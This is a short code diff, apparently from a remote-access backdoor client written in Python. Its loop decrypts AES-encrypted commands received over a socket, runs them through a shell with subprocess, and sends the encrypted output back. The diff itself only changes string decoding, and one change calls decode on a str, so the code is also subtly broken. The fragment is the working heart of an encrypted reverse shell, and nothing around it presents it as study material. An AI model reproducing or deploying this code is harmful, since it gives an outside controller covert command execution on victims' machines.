@@ -633,9 +633,9 @@ while True:
             ecommand = recv_one_message(s)
             command = AES256.decrypt(ecommand, d_key16)
 
-            cmd = subprocess.Popen(command[:], shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+            cmd = subprocess.Popen(command[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
             output_byte = cmd.stdout.read() + cmd.stderr.read()
-            output_str = str(output_byte)
+            output_str = str(output_byte).decode('utf-8')
             currentWD = os.getcwd() + "> "
 
             eoutput = AES256._encrypt(output_str, d_key16)
